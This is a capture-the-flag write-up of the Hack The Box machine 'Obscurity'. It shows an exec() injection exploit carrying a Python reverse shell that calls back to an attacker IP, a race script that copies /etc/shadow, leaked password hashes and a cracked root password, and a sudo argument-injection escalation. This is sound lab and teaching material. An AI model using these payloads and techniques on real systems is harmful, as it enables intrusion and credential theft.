---
title: Hackthebox Obscurity Writeup
date: 2020-05-09 15:00:00 +0530
categories: [Hackthebox, Machine]
tags: [Hackthebox, Linux, Python, Source Code Review]
image:
  path: /assets/img/post/hackthebox/obscurity/main.png
---

# Information:~$

| Title         | Details       |
| -------- |:--------:|
| Name         |Obscurity |
| IP     | 10.10.10.168    |
| Difficulty| Medium     |
| Points | 30 |
| OS | Linux|


# Brief:~$



# Reconnaissance:~$

We will start with basic `nmap` scan

## Nmap:~$

```bash
nmap -sC -sV 10.10.10.168
```
```bash
# Nmap 7.80 scan initiated Wed Feb 26 23:04:36 2020 as: nmap -sC -sV -oA nmap/initial 10.10.10.168
Nmap scan report for 10.10.10.168
Host is up (0.33s latency).
Not shown: 996 filtered ports
PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 33:d3:9a:0d:97:2c:54:20:e1:b0:17:34:f4:ca:70:1b (RSA)
|   256 f6:8b:d5:73:97:be:52:cb:12:ea:8b:02:7c:34:a3:d7 (ECDSA)
|_  256 e8:df:55:78:76:85:4b:7b:dc:70:6a:fc:40:cc:ac:9b (ED25519)
80/tcp   closed http
8080/tcp open   http-proxy BadHTTPServer
|_http-server-header: BadHTTPServer
|_http-title: 0bscura
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Feb 26 23:05:48 2020 -- 1 IP address (1 host up) scanned in 71.69 seconds
```

Let's start we with `PORT 8080`

It shows there is some source code leak

> Message to server devs: the current source code for the web server is in 'SuperSecureServer.py' in the secret development directory 

Let's do Fuzzing 

```bash
 ~/htb/boxes/ROOTED/Obscurity >> ffuf -c -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.168:8080/FUZZ/SuperSecureServer.py

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0-git
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.168:8080/FUZZ/SuperSecureServer.py
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

develop                 [Status: 200, Size: 5892, Words: 1806, Lines: 171]
:: Progress: [4614/4614] :: Job [1/1] :: 107 req/sec :: Duration: [0:00:43] :: Errors: 0 ::
```
A quick look at what we have

```python
import socket
import threading
from datetime import datetime
import sys
import os
import mimetypes
import urllib.parse
import subprocess

................................

    def serveDoc(self, path, docRoot):
        path = urllib.parse.unquote(path)
        try:
            info = "output = 'Document: {}'" # Keep the output for later debug
            exec(info.format(path)) # This is how you do string formatting, right?
            cwd = os.path.dirname(os.path.realpath(__file__))
            docRoot = os.path.join(cwd, docRoot)
................................
       
```
# Initial Foothold:~$

Let's find `sensitive` functions and find the key points:

```python
def serveDoc(self, path, docRoot):
    path = urllib.parse.unquote(path)
    try:
        info = "output = 'Document: {}'" # Keep the output for later debug
        exec(info.format(path)) # This is how you do string formatting, right?
        cwd = os.path.dirname(os.path.realpath(__file__))
        docRoot = os.path.join(cwd, docRoot)
```
The path here is a tainted parameter, and the exec function has command injection:

```bash
path = "\';os.system('whoami')#"
```
We can Write a Script to Login

```python
#!/usr/bin/env python3
import requests
import urllib
import os

url='http://10.10.10.168:8080/'

path='5\''+'\nimport socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.153",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")\na=\''
print('Inital shell code:')


payload=urllib.parse.quote(path)
print('Payload quoted:')
print(url+payload)

resp=requests.get(url+payload)
print(resp.headers)
print(resp.text)
```
Let's Run the Exploit

```bash
 ~/htb/boxes/ROOTED/Obscurity >> python3 exploit.py 
Inital shell code:
Payload quoted:
http://10.10.10.168:8080/5%27%0Aimport%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%2210.10.14.94%22%2C9001%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bimport%20pty%3B%20pty.spawn%28%22/bin/bash%22%29%0Aa%3D%27
```
```bash
 ~/htb/boxes/ROOTED/Obscurity >> nc -nvlp 9001
listening on [any] 9001 ...
connect to [10.10.14.94] from (UNKNOWN) [10.10.10.168] 36172
www-data@obscure:/$ id && whoami
id && whoami
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data
www-data@obscure:/$
```

# Privilege Escalation:~$

## www-data -> robert:~$

We are in as www-data Let's See what we have

We find few files in `/home/robert`

```bash
www-data@obscure:/home/robert$ ls
ls
BetterSSH  out.txt               SuperSecureCrypt.py
check.txt  passwordreminder.txt  user.txt
www-data@obscure:/home/robert$ 
```
```bash
www-data@obscure:/home/robert$ cat check.txt
cat check.txt
Encrypting this file with your key should result in out.txt, make sure your key is correct! 
www-data@obscure:/home/robert$ cat out.txt
cat out.txt
¦ÚÈêÚÞØÛÝÝ×ÐÊßÞÊÚÉæßÝËÚÛÚêÙÉëéÑÒÝÍÐêÆáÙÞãÒÑÐáÙ¦ÕæØãÊÎÍßÚêÆÝáäèÎÍÚÎëÑÓäáÛÌ×v
www-data@obscure:/home/robert$ 
```

Let's Check SuperSecureCrypt.py

```python
www-data@obscure:/home/robert$  cat SuperSecureCrypt.py
cat SuperSecureCrypt.py

import sys
import argparse

def encrypt(text, key):
    keylen = len(key)
    keyPos = 0
    encrypted = ""
    for x in text:
        keyChr = key[keyPos]
        newChr = ord(x)
        newChr = chr((newChr + ord(keyChr)) % 255)
        encrypted += newChr
        keyPos += 1
        keyPos = keyPos % keylen
    return encrypted

def decrypt(text, key):
    keylen = len(key)
    keyPos = 0
    decrypted = ""
    for x in text:
        keyChr = key[keyPos]
        newChr = ord(x)
        newChr = chr((newChr - ord(keyChr)) % 255)
        decrypted += newChr
        keyPos += 1
        keyPos = keyPos % keylen
    return decrypted

parser = argparse.ArgumentParser(description='Encrypt with 0bscura\'s encryption algorithm')

parser.add_argument('-i',
                    metavar='InFile',
                    type=str,
                    help='The file to read',
                    required=False)

parser.add_argument('-o',
                    metavar='OutFile',
                    type=str,
                    help='Where to output the encrypted/decrypted file',
                    required=False)

parser.add_argument('-k',
                    metavar='Key',
                    type=str,
                    help='Key to use',
                    required=False)

parser.add_argument('-d', action='store_true', help='Decrypt mode')

args = parser.parse_args()

banner = "################################\n"
banner+= "#           BEGINNING          #\n"
banner+= "#    SUPER SECURE ENCRYPTOR    #\n"
banner+= "################################\n"
banner += "  ############################\n"
banner += "  #        FILE MODE         #\n"
banner += "  ############################"
print(banner)
if args.o == None or args.k == None or args.i == None:
    print("Missing args")
else:
    if args.d:
        print("Opening file {0}...".format(args.i))
        with open(args.i, 'r', encoding='UTF-8') as f:
            data = f.read()

        print("Decrypting...")
        decrypted = decrypt(data, args.k)

        print("Writing to {0}...".format(args.o))
        with open(args.o, 'w', encoding='UTF-8') as f:
            f.write(decrypted)
    else:
        print("Opening file {0}...".format(args.i))
        with open(args.i, 'r', encoding='UTF-8') as f:
            data = f.read()

        print("Encrypting...")
        encrypted = encrypt(data, args.k)

        print("Writing to {0}...".format(args.o))
        with open(args.o, 'w', encoding='UTF-8') as f:
            f.write(encrypted)
www-data@obscure:/home/robert$
```
After Some Source Code review we Wrote a Script to fetch the key

```python
#!/usr/bin/python3

f = open('/home/robert/out.txt', 'r',encoding='UTF-8').read()
g = open('/home/robert/check.txt', 'r').read()

out = []
check = []

for x in f:
        out.append(x)

for y in g:
        check.append(y)

for (i,j) in zip(out,check):
        print(f"{i} ==> {ord(i)}",end="\t")
        print(f"{j} ==> {ord(j)}",end="\t\t")
        key = chr((ord(i)-ord(j))%255)
        print(key)
```
We get `alexandrovich` as key and now we can decrpt passwordreminder.txt 

```bash
www-data@obscure:/home/robert$ python3 SuperSecureCrypt.py -i passwordreminder.txt -o /tmp/passwd.txt -k alexandrovich -d
xt -o /tmp/passwd.txt -k alexandrovich -dminder.tx
################################
#           BEGINNING          #
#    SUPER SECURE ENCRYPTOR    #
################################
  ############################
  #        FILE MODE         #
  ############################
Opening file passwordreminder.txt...
Decrypting...
Writing to /tmp/passwd.txt...
www-data@obscure:/home/robert$ cat /tmp/passwd.txt
cat /tmp/passwd.txt
SecThruObsFTW
www-data@obscure:/home/robert$ 
```

Use `SecThruObsFTW` to do SSH login as `robert` and obtain user.txt

```bash
 ~/htb/boxes/ROOTED/Obscurity >> ssh robert@10.10.10.168
robert@10.10.10.168's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat May  9 07:20:23 UTC 2020

  System load:  0.5               Processes:             120
  Usage of /:   45.9% of 9.78GB   Users logged in:       0
  Memory usage: 12%               IP address for ens160: 10.10.10.168
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

40 packages can be updated.
0 updates are security updates.


Last login: Mon Dec  2 10:23:36 2019 from 10.10.14.4
robert@obscure:~$ 
```
## robert -> root:~$

```bash
robert@obscure:~$ sudo -l
Matching Defaults entries for robert on obscure:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User robert may run the following commands on obscure:
    (ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
```
Let's Check BetterSSH.py

```python
import sys
import random, string
import os
import time
import crypt
import traceback
import subprocess

path = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
session = {"user": "", "authenticated": 0}
try:
    session['user'] = input("Enter username: ")
    passW = input("Enter password: ")

    with open('/etc/shadow', 'r') as f:
        data = f.readlines()
    data = [(p.split(":") if "$" in p else None) for p in data]
    passwords = []
    for x in data:
        if not x == None:
            passwords.append(x)

    passwordFile = '\n'.join(['\n'.join(p) for p in passwords]) 
    with open('/tmp/SSH/'+path, 'w') as f:
        f.write(passwordFile)
    time.sleep(.1)
    salt = ""
    realPass = ""
    for p in passwords:
        if p[0] == session['user']:
            salt, realPass = p[1].split('$')[2:]
            break

    if salt == "":
        print("Invalid user")
        os.remove('/tmp/SSH/'+path)
        sys.exit(0)
    salt = '$6$'+salt+'$'
    realPass = salt + realPass

    hash = crypt.crypt(passW, salt)

    if hash == realPass:
        print("Authed!")
        session['authenticated'] = 1
    else:
        print("Incorrect pass")
        os.remove('/tmp/SSH/'+path)
        sys.exit(0)
    os.remove(os.path.join('/tmp/SSH/',path))
except Exception as e:
    traceback.print_exc()
    sys.exit(0)

if session['authenticated'] == 1:
    while True:
        command = input(session['user'] + "@Obscure$ ")
        cmd = ['sudo', '-u',  session['user']]
        cmd.extend(command.split(" "))
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        o,e = proc.communicate()
        print('Output: ' + o.decode('ascii'))
        print('Error: '  + e.decode('ascii')) if len(e.decode('ascii')) > 0 else print('')
```

From source code audit we found 2 methods for `privilege escalation`

### Method 1:~$

```python
with open('/etc/shadow', 'r') as f:
        data = f.readlines()
    data = [(p.split(":") if "$" in p else None) for p in data]
    passwords = []
    for x in data:
        if not x == None:
            passwords.append(x)

    passwordFile = '\n'.join(['\n'.join(p) for p in passwords]) 
    with open('/tmp/SSH/'+path, 'w') as f:
        f.write(passwordFile)
```

`/etc/shadow` will be written to `tmp/SSH/`

So we can write a script

```bash
#!/bin/bash
DIR="./SSH/"

while :
do
        if [ "$(ls -A $DIR)" ]; then
                cat $DIR* > gotcha.txt
                exit
        fi
done
```
Put the script in `/tmp/` directory and make an SSH directory in tmp

Run the exploit and open another session and run BetterSSH.py in that

```bash
robert@obscure:~$ sudo -l
Matching Defaults entries for robert on obscure:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User robert may run the following commands on obscure:
    (ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
robert@obscure:~$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
Enter username: robert
Enter password: SecThruObsFTW
Authed!
robert@Obscure$ 
```

```bash
robert@obscure:/tmp$ ./exploit.sh 
robert@obscure:/tmp$ ls
exploit.sh  systemd-private-589513f8044149678f2e6ced827b7d49-systemd-resolved.service-AdVnCB
gotcha.txt  systemd-private-589513f8044149678f2e6ced827b7d49-systemd-timesyncd.service-ETC35V
SSH         vmware-root_587-4013395661
robert@obscure:/tmp$ cat gotcha.txt 
root
$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1
18226
0
99999
7


robert
$6$fZZcDG7g$lfO35GcjUmNs3PSjroqNGZjH35gN4KjhHbQxvWO0XU.TCIHgavst7Lj8wLF/xQ21jYW5nD66aJsvQSP/y1zbH/
18163
0
99999
7


robert@obscure:/tmp$
```
There are different ways to decrypt the hash using john or you can even google the hash

`mercedes` Password for root

```bash
robert@obscure:/tmp$ su root
Password: 
root@obscure:/tmp# id && whoami
uid=0(root) gid=0(root) groups=0(root)
root
root@obscure:/tmp# 
```

### Method 2:~$

```python
if session['authenticated'] == 1:
    while True:
        command = input(session['user'] + "@Obscure$ ")
        cmd = ['sudo', '-u',  session['user']]
        cmd.extend(command.split(" "))
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
```

`sudo -u robert -u root` Will overwrite the previous -u parameter value.


Create a SSH directory in /tmp
and run the following command

```bash
robert@obscure:~$ sudo -l
Matching Defaults entries for robert on obscure:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User robert may run the following commands on obscure:
    (ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
robert@obscure:~$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py 
Enter username: robert
Enter password: SecThruObsFTW
Authed!
robert@Obscure$ -u root cat /root/root.txt
Output: 512********************9e3

robert@Obscure$ 
```

With this, we come to the end of the story of how We owned Obscurity 😃

Thank you for reading !!!

*We would love to hear about any suggestions or queries.*